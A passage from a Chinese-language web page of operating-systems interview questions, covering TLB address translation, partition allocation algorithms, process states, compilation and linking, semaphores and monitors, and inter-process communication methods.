title="9、如果系统中具有快表后，那么地址的转换过程变成什么样了？"></a>9、如果系统中具有快表后，那么地址的转换过程变成什么样了？</h4><blockquote><p>①CPU给出逻辑地址，由某个硬件算得页号、页内偏移量，将页号与快表中的所有页号进行比较。②如果找到匹配的页号，说明要访问的页表项在快表中有副本，则直接从中取出该页对应的内存块号，再将内存块号与页内偏移量拼接形成物理地址，最后，访问该物理地址对应的内存单元。因此，若快表命中，则访问某个逻辑地址仅需一次访存即可。<br>③如果没有找到匹配的页号，则需要访问内存中的页表，找到对应页表项，得到页面存放的内存块号，再将内存块号与页内偏移量拼接形成物理地址，最后，访问该物理地址对应的内存单元。因此,若快表未命中，则访问某个逻辑地址需要两次访存(注意:在找到页表项后，应同时将其存入快表,以便后面可能的再次访问。但若快表已满，则必须按照-定的算法对旧的页表项进行替换)</p></blockquote><p>由于查询快表的速度比查询页表的速度快很多，因此只要快表命中，就可以节省很多时间。<br>因为局部性原理，–般来说快表的命中率可以达到90%以上。</p><p>例:某系统使用基本分页存储管理，并采用了具有快表的地址变换机构。访问- -次快表耗时1us， 访问一次内存耗时100us。若快表的命中率为90%，那么访问一个逻辑地址的平均耗时是多少?<br>(1+100) <em> 0.9 + (1+100+100) </em> 0.1 = 111 us<br>有的系统支持快表和慢表同时查找，如果是这样，平均耗时应该是(1+100) <em> 0.9+ (100+100) </em>0.1=110.9 us<br>若未采用快表机制，则访问一个逻辑地址需要100+100 = 200us<br>显然，引入快表机制后，访问一个逻辑地址的速度快多了。</p><h4 id="10、内存交换和覆盖有什么区别？"><a href="#10、内存交换和覆盖有什么区别？" class="headerlink" title="10、内存交换和覆盖有什么区别？"></a>10、内存交换和覆盖有什么区别？</h4><p>交换技术主要是在不同进程（或作业）之间进行，而覆盖则用于同一程序或进程中。</p><h4 id="11、动态分区分配算法有哪几种？可以分别说说吗？"><a href="#11、动态分区分配算法有哪几种？可以分别说说吗？" class="headerlink" title="11、动态分区分配算法有哪几种？可以分别说说吗？"></a>11、动态分区分配算法有哪几种？可以分别说说吗？</h4><h5 id="1、首次适应算法"><a href="#1、首次适应算法" class="headerlink" title="1、首次适应算法"></a>1、首次适应算法</h5><p>算法思想：每次都从低地址开始查找，找到第–个能满足大小的空闲分区。</p><p>如何实现：空闲分区以地址递增的次序排列。每次分配内存时顺序查找空闲分区链( 或空闲分[表)，找到大小能满足要求的第-一个空闲分区。<br><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/20190606084716395.png" alt=""></p><h5 id="2、最佳适应算法"><a href="#2、最佳适应算法" class="headerlink" title="2、最佳适应算法"></a>2、最佳适应算法</h5><p>算法思想:由于动态分区分配是一种连续分配方式，为各进程分配的空间必须是连续的一整片区域。因此为了保证当“大进程”到来时能有连续的大片空间，可以尽可能多地留下大片的空闲区,即，优先使用更小的空闲区。</p><p>如何实现:空闲分区按容量递增次序链接。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第-一个空闲分区。<br><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226211116.png" alt=""></p><h5 id="3、最坏适应算法"><a href="#3、最坏适应算法" class="headerlink" title="3、最坏适应算法"></a>3、最坏适应算法</h5><p>又称最大适应算法(Largest Fit)</p><p>算法思想:为了解决最佳适应算法的问题—即留下太多难以利用的小碎片，可以在每次分配时优先使用最大的连续空闲区，这样分配后剩余的空闲区就不会太小，更方便使用。</p><p>如何实现:空闲分区按容量递减次序链接。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第-一个空闲分区。<br><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226211213.png" alt=""></p><h5 id="4、邻近适应算法"><a href="#4、邻近适应算法" class="headerlink" title="4、邻近适应算法"></a>4、邻近适应算法</h5><p>算法思想：首次适应算法每次都从链头开始查找的。这可能会导致低地址部分出现很多小的空闲分区，而每次分配查找时，都要经过这些分区，因此也增加了查找的开销。如果每次都从上次查找结束的位置开始检索，就能解决上述问题。</p><p>如何实现：空闲分区以地址递增的顺序排列(可排成-一个循环链表)。每次分配内存时从上次查找结束的位置开始查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。<br><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226211244.png" alt=""></p><h5 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h5><p>首次适应不仅最简单，通常也是最好最快，不过首次适应算法会使得内存低地址部分出现很多小的空闲分区，而每次查找都要经过这些分区，因此也增加了查找的开销。邻近算法试图解决这个问题，但实际上，它常常会导致在内存的末尾分配空间分裂成小的碎片，它通常比首次适应算法结果要差。</p><p>最佳导致大量碎片，最坏导致没有大的空间。</p><p>进过实验，首次适应比最佳适应要好，他们都比最坏好。</p><div class="table-container"><table><thead><tr><th>算法</th><th>算法思想</th><th>分区排列顺序</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>首次适应</td><td>从头到尾找适合的分区</td><td>空闲分区以地址递增次序排列</td><td>综合看性能最好。<strong>算法开销小</strong>，回收分区后一.般不需要对空闲分区队列重新排序</td><td></td></tr><tr><td>最佳适应</td><td>优先使用更小的分区，以保留更多大分区</td><td>空闲分区以容量递增次序排列</td><td>会有更多的大分区被保留下来，更能满足大进程需求</td><td>会产生很多太小的、难以利用的碎片;<strong>算法开销大</strong>，回收分区后可能需要对空闲分区队列重新排序</td></tr><tr><td>最坏适应</td><td>优先使用更大的分区，以防止产生太小的不可用的碎片</td><td>空闲分区以容量递减次序排列</td><td>可以减少难以利用的小碎片</td><td>大分区容易被用完，不利于大进程;<strong>算法开销大</strong>(原因同上)</td></tr><tr><td>邻近适应</td><td>由首次适应演变而来，每次从上次查找结束位置开始查找</td><td>空闲分区以地址递增次序排列(可排列成循环链表)</td><td>不用每次都从低地址的小分区开始检索。<strong>算法开销小</strong>(原因同首次适应算法)</td><td>会使高地址的大分区也被用完</td></tr></tbody></table></div><h4 id="12、虚拟技术你了解吗？"><a href="#12、虚拟技术你了解吗？" class="headerlink" title="12、虚拟技术你了解吗？"></a>12、虚拟技术你了解吗？</h4><p>虚拟技术把一个物理实体转换为多个逻辑实体。</p><p>主要有两种虚拟技术：时（时间）分复用技术和空（空间）分复用技术。</p><p>多进程与多线程：多个进程能在同一个处理器上并发执行使用了时分复用技术，让每个进程轮流占用处理器，每次只执行一小个时间片并快速切换。</p><p>虚拟内存使用了空分复用技术，它将物理内存抽象为地址空间，每个进程都有各自的地址空间。地址空间的页被映射到物理内存，地址空间的页并不需要全部在物理内存中，当使用到一个没有在物理内存的页时，执行页面置换算法，将该页置换到内存中。</p><h4 id="13、进程状态的切换你知道多少？"><a href="#13、进程状态的切换你知道多少？" class="headerlink" title="13、进程状态的切换你知道多少？"></a>13、进程状态的切换你知道多少？</h4><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226220417.png" alt=""></p><ul><li>就绪状态（ready）：等待被调度</li><li>运行状态（running）</li><li>阻塞状态（waiting）：等待资源</li></ul><p>应该注意以下内容：</p><ul><li>只有就绪态和运行态可以相互转换，其它的都是单向转换。就绪状态的进程通过调度算法从而获得 CPU 时间，转为运行状态；而运行状态的进程，在分配给它的 CPU 时间片用完之后就会转为就绪状态，等待下一次调度。</li><li>阻塞状态是缺少需要的资源从而由运行状态转换而来，但是该资源不包括 CPU 时间，缺少 CPU 时间会从运行态转换为就绪态。</li></ul><h4 id="14、一个程序从开始运行到结束的完整过程，你能说出来多少？"><a href="#14、一个程序从开始运行到结束的完整过程，你能说出来多少？" class="headerlink" title="14、一个程序从开始运行到结束的完整过程，你能说出来多少？"></a>14、一个程序从开始运行到结束的完整过程，你能说出来多少？</h4><p>四个过程：</p><p><strong>（1）预编译</strong><br>主要处理源代码文件中的以“#”开头的预编译指令。处理规则见下<br>1、删除所有的#define，展开所有的宏定义。<br>2、处理所有的条件预编译指令，如“#if”、“#endif”、“#ifdef”、“#elif”和“#else”。<br>3、处理“#include”预编译指令，将文件内容替换到它的位置，这个过程是递归进行的，文件中包含其他<br>文件。<br>4、删除所有的注释，“//”和“/**/”。<br>5、保留所有的#pragma 编译器指令，编译器需要用到他们，如：#pragma once 是为了防止有文件被重<br>复引用。<br>6、添加行号和文件标识，便于编译时编译器产生调试用的行号信息，和编译时产生编译错误或警告是<br>能够显示行号。</p><p><strong>（2）编译</strong><br>把预编译之后生成的xxx.i或xxx.ii文件，进行一系列词法分析、语法分析、语义分析及优化后，生成相应<br>的汇编代码文件。<br>1、词法分析：利用类似于“有限状态机”的算法，将源代码程序输入到扫描机中，将其中的字符序列分<br>割成一系列的记号。<br>2、语法分析：语法分析器对由扫描器产生的记号，进行语法分析，产生语法树。由语法分析器输出的<br>语法树是一种以表达式为节点的树。<br>3、语义分析：语法分析器只是完成了对表达式语法层面的分析，语义分析器则对表达式是否有意义进<br>行判断，其分析的语义是静态语义——在编译期能分期的语义，相对应的动态语义是在运行期才能确定<br>的语义。<br>4、优化：源代码级别的一个优化过程。<br>5、目标代码生成：由代码生成器将中间代码转换成目标机器代码，生成一系列的代码序列——汇编语言<br>表示。<br>6、目标代码优化：目标代码优化器对上述的目标机器代码进行优化：寻找合适的寻址方式、使用位移<br>来替代乘法运算、删除多余的指令等。<br><strong>（3）汇编</strong><br>将汇编代码转变成机器可以执行的指令(机器码文件)。 汇编器的汇编过程相对于编译器来说更简单，没<br>有复杂的语法，也没有语义，更不需要做指令优化，只是根据汇编指令和机器指令的对照表一一翻译过<br>来，汇编过程有汇编器as完成。经汇编之后，产生目标文件(与可执行文件格式几乎一样)xxx.o(Linux<br>下)、xxx.obj(Windows下)。<br><strong>（4）链接</strong><br>将不同的源文件产生的目标文件进行链接，从而形成一个可以执行的程序。链接分为静态链接和动态链<br>接：<br>1、静态链接：<br>函数和数据被编译进一个二进制文件。在使用静态库的情况下，在编译链接可执行文件时，链接器从库<br>中复制这些函数和数据并把它们和应用程序的其它模块组合起来创建最终的可执行文件。<br>空间浪费：因为每个可执行程序中对所有需要的目标文件都要有一份副本，所以如果多个程序对同一个<br>目标文件都有依赖，会出现同一个目标文件都在内存存在多个副本；<br>更新困难：每当库函数的代码修改了，这个时候就需要重新进行编译链接形成可执行程序。<br>运行速度快：但是静态链接的优点就是，在可执行程序中已经具备了所有执行程序所需要的任何东西，<br>在执行的时候运行速度快。<br>2、动态链接：<br>动态链接的基本思想是把程序按照模块拆分成各个相对独立部分，在程序运行时才将它们链接在一起形<br>成一个完整的程序，而不是像静态链接一样把所有程序模块都链接成一个单独的可执行文件。<br>共享库：就是即使需要每个程序都依赖同一个库，但是该库不会像静态链接那样在内存中存在多份副<br>本，而是这多个程序在执行时共享同一份副本；<br>更新方便：更新时只需要替换原来的目标文件，而无需将所有的程序再重新链接一遍。当程序下一次运<br>行时，新版本的目标文件会被自动加载到内存并且链接起来，程序就完成了升级的目标。<br>性能损耗：因为把链接推迟到了程序运行时，所以每次执行程序都需要进行链接，所以性能会有一定损<br>失。</p><blockquote><p>《操作系统（三）》：<a href="https://www.nowcoder.com/tutorial/93/675fd4af3ab34b2db0ae650855aa52d5">https://www.nowcoder.com/tutorial/93/675fd4af3ab34b2db0ae650855aa52d5</a></p></blockquote><h4 id="15、通过例子讲解逻辑地址转换为物理地址的基本过程"><a href="#15、通过例子讲解逻辑地址转换为物理地址的基本过程" class="headerlink" title="15、通过例子讲解逻辑地址转换为物理地址的基本过程"></a>15、通过例子讲解逻辑地址转换为物理地址的基本过程</h4><p>可以借助进程的页表将逻辑地址转换为物理地址。</p><p>通常会在系统中设置一个页表寄存器(PTR)，存放页表在内存中的起始地址F和页表长度M。进程未执行时，页表的始址和页表长度放在进程控制块(PCB) 中，当进程被调度时，操作系统内核会把它们放到页表寄存器中。</p><p>注意:页面大小是2的整数幂<br>设页面大小为L，逻辑地址A到物理地址E的变换过程如下:</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/20190606085408697.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226211529.png" alt=""><br>例:若页面大小L为1K字节，页号2对应的内存块号b=8，将逻辑地址A=2500转换为物理地址E。<br>等价描述：某系统按字节寻址，逻辑地址结构中，页内偏移量占10位(说明一个页面的大小为2^10B = 1KB)，页号2对应的内存块号 b=8，将逻辑地址A=2500转换为物理地址E。</p><blockquote><p>①计算页号、页内偏移量<br>页号P=A/L = 2500/1024 = 2; 页内偏移量W= A%L = 2500%1024 = 452</p><p>②根据题中条件可知，页号2没有越界，其存放的内存块号b=8</p><p>③物理地址E=b<em>L+W=8 </em> 1024+ 425 = 8644</p><p>在分页存储管理(页式管理)的系统中，只要确定了每个页面的大小，逻辑地址结构就确定了。因此，页式管理中地址是-维的。即，只要给出一个逻辑地址，系统就可以自动地算出页号、页内偏移量两个部分，并不需要显式地告诉系统这个逻辑地址中，页内偏移量占多少位。</p></blockquote><h4 id="16、进程同步的四种方法？"><a href="#16、进程同步的四种方法？" class="headerlink" title="16、进程同步的四种方法？"></a>16、进程同步的四种方法？</h4><h5 id="1-临界区"><a href="#1-临界区" class="headerlink" title="1. 临界区"></a>1. 临界区</h5><p>对临界资源进行访问的那段代码称为临界区。</p><p>为了互斥访问临界资源，每个进程在进入临界区之前，需要先进行检查。</p><pre class="language-markup" data-language="markup"><code class="language-markup">// entry section// critical section;// exit section</code></pre><h5 id="2-同步与互斥"><a href="#2-同步与互斥" class="headerlink" title="2. 同步与互斥"></a>2. 同步与互斥</h5><ul><li>同步：多个进程因为合作产生的直接制约关系，使得进程有一定的先后执行关系。</li><li>互斥：多个进程在同一时刻只有一个进程能进入临界区。</li></ul><h5 id="3-信号量"><a href="#3-信号量" class="headerlink" title="3. 信号量"></a>3. 信号量</h5><p>信号量（Semaphore）是一个整型变量，可以对其执行 down 和 up 操作，也就是常见的 P 和 V 操作。</p><ul><li><strong>down</strong>   : 如果信号量大于 0 ，执行 -1 操作；如果信号量等于 0，进程睡眠，等待信号量大于 0；</li><li><strong>up</strong>  ：对信号量执行 +1 操作，唤醒睡眠的进程让其完成 down 操作。</li></ul><p>down 和 up 操作需要被设计成原语，不可分割，通常的做法是在执行这些操作的时候屏蔽中断。</p><p>如果信号量的取值只能为 0 或者 1，那么就成为了   <strong>互斥量（Mutex）</strong>  ，0 表示临界区已经加锁，1 表示临界区解锁。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">int</span> semaphore<span class="token punctuation">;</span>semaphore mutex <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">P1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 临界区</span>    <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">P2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 临界区</span>    <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><font size=3>   <strong>使用信号量实现生产者-消费者问题</strong>   </font> &lt;/br&gt;</p><p>问题描述：使用一个缓冲区来保存物品，只有缓冲区没有满，生产者才可以放入物品；只有缓冲区不为空，消费者才可以拿走物品。</p><p>因为缓冲区属于临界资源，因此需要使用一个互斥量 mutex 来控制对缓冲区的互斥访问。</p><p>为了同步生产者和消费者的行为，需要记录缓冲区中物品的数量。数量可以使用信号量来进行统计，这里需要使用两个信号量：empty 记录空缓冲区的数量，full 记录满缓冲区的数量。</p><p>其中，empty 信号量是在生产者进程中使用，当 empty 不为 0 时，生产者才可以放入物品；full 信号量是在消费者进程中使用，当 full 信号量不为 0 时，消费者才可以取走物品。</p><p><strong>注意</strong>，不能先对缓冲区进行加锁，再测试信号量。也就是说，不能先执行 down(mutex) 再执行 down(empty)。如果这么做了，那么可能会出现这种情况：生产者对缓冲区加锁后，执行 down(empty) 操作，发现 empty = 0，此时生产者睡眠。</p><p>消费者不能进入临界区，因为生产者对缓冲区加锁了，消费者就无法执行 up(empty) 操作，empty 永远都为 0，导致生产者永远等待下，不会释放锁，消费者因此也会永远等待下去。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">100</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">int</span> semaphore<span class="token punctuation">;</span>semaphore mutex <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>semaphore empty <span class="token operator">=</span> N<span class="token punctuation">;</span>semaphore full <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">producer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> item <span class="token operator">=</span> <span class="token function">produce_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>empty<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">insert_item</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>full<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">consumer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>full<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> item <span class="token operator">=</span> <span class="token function">remove_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">consume_item</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>empty<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h5 id="4-管程"><a href="#4-管程" class="headerlink" title="4. 管程"></a>4. 管程</h5><p>使用信号量机制实现的生产者消费者问题需要客户端代码做很多控制，而管程把控制的代码独立出来，不仅不容易出错，也使得客户端代码调用更容易。</p><p>c 语言不支持管程，下面的示例代码使用了类 Pascal 语言来描述管程。示例代码的管程提供了 insert() 和 remove() 方法，客户端代码通过调用这两个方法来解决生产者-消费者问题。</p><pre class="language-pascal" data-language="pascal"><code class="language-pascal">monitor ProducerConsumer    integer i<span class="token punctuation">;</span>    condition c<span class="token punctuation">;</span>    <span class="token keyword">procedure</span> insert<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">begin</span>        <span class="token comment">// ...</span>    <span class="token keyword">end</span><span class="token punctuation">;</span>    <span class="token keyword">procedure</span> remove<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">begin</span>        <span class="token comment">// ...</span>    <span class="token keyword">end</span><span class="token punctuation">;</span><span class="token keyword">end</span> monitor<span class="token punctuation">;</span></code></pre><p>管程有一个重要特性：在一个时刻只能有一个进程使用管程。进程在无法继续执行的时候不能一直占用管程，否则其它进程永远不能使用管程。</p><p>管程引入了   <strong>条件变量</strong>   以及相关的操作：<strong>wait()</strong> 和 <strong>signal()</strong> 来实现同步操作。对条件变量执行 wait() 操作会导致调用进程阻塞，把管程让出来给另一个进程持有。signal() 操作用于唤醒被阻塞的进程。</p><p><font size=3>  <strong>使用管程实现生产者-消费者问题</strong>  </font><br></p><pre class="language-pascal" data-language="pascal"><code class="language-pascal"><span class="token comment">// 管程</span>monitor ProducerConsumer    condition full<span class="token punctuation">,</span> empty<span class="token punctuation">;</span>    integer count <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span>    condition c<span class="token punctuation">;</span>    <span class="token keyword">procedure</span> insert<span class="token punctuation">(</span>item<span class="token punctuation">:</span> integer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">begin</span>        <span class="token keyword">if</span> count <span class="token operator">=</span> N <span class="token keyword">then</span> wait<span class="token punctuation">(</span>full<span class="token punctuation">)</span><span class="token punctuation">;</span>        insert_item<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>        count <span class="token operator">:=</span> count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> count <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">then</span> signal<span class="token punctuation">(</span>empty<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> remove<span class="token punctuation">:</span> integer<span class="token punctuation">;</span>    <span class="token keyword">begin</span>        <span class="token keyword">if</span> count <span class="token operator">=</span> <span class="token number">0</span> <span class="token keyword">then</span> wait<span class="token punctuation">(</span>empty<span class="token punctuation">)</span><span class="token punctuation">;</span>        remove <span class="token operator">=</span> remove_item<span class="token punctuation">;</span>        count <span class="token operator">:=</span> count <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> count <span class="token operator">=</span> N <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">then</span> signal<span class="token punctuation">(</span>full<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token punctuation">;</span><span class="token keyword">end</span> monitor<span class="token punctuation">;</span><span class="token comment">// 生产者客户端</span><span class="token keyword">procedure</span> producer<span class="token keyword">begin</span>    <span class="token keyword">while</span> <span class="token keyword">true</span> <span class="token keyword">do</span>    <span class="token keyword">begin</span>        item <span class="token operator">=</span> produce_item<span class="token punctuation">;</span>        ProducerConsumer<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">end</span><span class="token punctuation">;</span><span class="token comment">// 消费者客户端</span><span class="token keyword">procedure</span> consumer<span class="token keyword">begin</span>    <span class="token keyword">while</span> <span class="token keyword">true</span> <span class="token keyword">do</span>    <span class="token keyword">begin</span>        item <span class="token operator">=</span> ProducerConsumer<span class="token punctuation">.</span>remove<span class="token punctuation">;</span>        consume_item<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">end</span><span class="token punctuation">;</span></code></pre><h4 id="17、操作系统在对内存进行管理的时候需要做些什么"><a href="#17、操作系统在对内存进行管理的时候需要做些什么" class="headerlink" title="17、操作系统在对内存进行管理的时候需要做些什么?"></a>17、操作系统在对内存进行管理的时候需要做些什么?</h4><ul><li>操作系统负责内存空间的分配与回收。</li><li>操作系统需要提供某种技术从逻辑上对内存空间进行扩充。</li><li>操作系统需要提供地址转换功能，负责程序的逻辑地址与物理地址的转换。</li><li>操作系统需要提供内存保护功能。保证各进程在各自存储空间内运行，互不干扰</li></ul><h4 id="18、进程通信方法（Linux和windows下），线程通信方法（Linux和windows下）"><a href="#18、进程通信方法（Linux和windows下），线程通信方法（Linux和windows下）" class="headerlink" title="18、进程通信方法（Linux和windows下），线程通信方法（Linux和windows下）"></a>18、进程通信方法（Linux和windows下），线程通信方法（Linux和windows下）</h4><p><strong>进程通信方法</strong></p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210227000719.png" alt=""></p><div class="table-container"><table><thead><tr><th>名称及方式</th></tr></thead><tbody><tr><td>管道(pipe)：允许一个进程和另一个与它有共同祖先的进程之间进行通信</td></tr><tr><td>命名管道(FIFO)：类似于管道，但是它可以用于任何两个进程之间的通信，命名管道在文件系统中有对应的文件名。命名管道通过命令mkfifo或系统调用mkfifo来创建</td></tr><tr><td>消息队列(MQ)：消息队列是消息的连接表，包括POSIX消息对和System V消息队列。有足够权限的进程可以向队列中添加消息，被赋予读权限的进程则可以读走队列中的消息。消息队列克服了信号承载信息量少，管道只能成该无格式字节流以及缓冲区大小受限等缺点；</td></tr><tr><td>信号量(semaphore)：信号量主要作为进程间以及同进程不同线程之间的同步手段；</td></tr><tr><td>共享内存(shared memory)：它使得多个进程可以访问同一块内存空间，<strong>是最快的可用IPC形式。</strong>这是针对其他通信机制运行效率较低而设计的。它往往与其他通信机制，如信号量结合使用，以达到进程间的同步及互斥</td></tr><tr><td>信号(signal)：信号是比较复杂的通信方式，用于通知接收进程有某种事情发生，除了用于进程间通信外，进程还可以发送信号给进程本身</td></tr><tr><td>内存映射(mapped memory)：内存映射允许任何多个进程间通信，每一个使用该机制的进程通过把一个共享的文件映射到自己的进程地址空间来实现它</td></tr><tr><td>Socket：它是更为通用的进程间通信机制，可用于不同机器之间的进程间通信</td></tr></tbody></table></div><p><strong>线程通信方法</strong></p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1567935620496.png" alt=""></p><div class="table-container"><table><thead><tr><th>名称及含义</th></tr></thead><tbody><tr><td><strong>Linux：</strong></td></tr><tr><td>信号：类似进程间的信号处理</td></tr><tr><td>锁机制：互斥锁、读写锁和自旋锁</td></tr><tr><td>条件变量：使用通知的方式解锁，与互斥锁配合使用</td></tr><tr><td>信号量：包括无名线程信号量和命名线程信号量</td></tr><tr><td><strong>Windows：</strong></td></tr><tr><td>全局变量：需要有多个线程来访问一个全局变量时，通常我们会在这个全局变量前加上volatile声明，以防编译器对此变量进行优化</td></tr><tr><td>Message消息机制：常用的Message通信的接口主要有两个：PostMessage和PostThreadMessage，PostMessage为线程向主窗口发送消息。而PostThreadMessage是任意两个线程之间的通信接口。</td></tr><tr><td>CEvent对象：CEvent为MFC中的一个对象，可以通过对CEvent的触发状态进行改变，从而实现线程间的通信和同步，这个主要是实现线程直接同步的一种方法。</td></tr></tbody></table></div><h4 id="19、程间通信有哪几种方式？把你知道的都说出来"><a href="#19、程间通信有哪几种方式？把你知道的都说出来" class="headerlink" title="19、程间通信有哪几种方式？把你知道的都说出来"></a>19、程间通信有哪几种方式？把你知道的都说出来</h4><p>Linux几乎支持全部UNIX进程间通信方法，包括管道（有名管道和无名管道）、消息队列、共享内存、信号量和套接字。其中前四个属于同一台机器下进程间的通信，套接字则是用于网络通信。</p><p><strong>管道</strong></p><ul><li><p>无名管道</p><ul><li><p>无名管道特点：</p><ul><li><p>无名管道是一种特殊的文件，这种文件只存在于内存中。</p></li><li><p>无名管道只能用于父子进程或兄弟进程之间，必须用于具有亲缘关系的进程间的通信。</p></li><li><p>无名管道只能由一端向另一端发送数据，是半双工方式，如果双方需要同时收发数据需要两个管道。</p></li></ul></li><li><p>相关接口：</p><ul><li><p>int pipe(int fd[2]);</p><ul><li>fd[2]：管道两端用fd[0]和fd[1]来描述，读的一端用fd[0]表示，写的一端用fd[1]表示。通信双方的进程中写数据的一方需要把fd[0]先close掉，读的一方需要先把fd[1]给close掉。</li></ul></li></ul></li></ul></li><li><p>有名管道：</p><ul><li><p>有名管道特点：</p><ul><li><p>有名管道是FIFO文件，存在于文件系统中，可以通过文件路径名来指出。</p></li><li><p>有名管道可以在不具有亲缘关系的进程间进行通信。</p></li></ul></li><li><p>相关接口：</p><ul><li><p>int mkfifo(const char *pathname, mode_t mode);</p><ul><li><p>pathname：即将创建的FIFO文件路径，如果文件存在需要先删除。</p></li><li><p>mode：和open()中的参数相同。</p></li></ul></li></ul></li></ul></li></ul><p><strong>消息队列</strong></p><p>相比于 FIFO，消息队列具有以下优点：</p><ul><li>消息队列可以独立于读写进程存在，从而避免了 FIFO 中同步管道的打开和关闭时可能产生的困难；</li><li>避免了 FIFO 的同步阻塞问题，不需要进程自己提供同步方法；</li><li>读进程可以根据消息类型有选择地接收消息，而不像 FIFO 那样只能默认地接收。</li></ul><p><strong>共享内存</strong></p><p>进程可以将同一段共享内存连接到它们自己的地址空间，所有进程都可以访问共享内存中的地址，如果某个进程向共享内存内写入数据，所做的改动将立即影响到可以访问该共享内存的其他所有进程。</p><ul><li><p>相关接口</p><ul><li><p>创建共享内存：int shmget(key_t key, int size, int 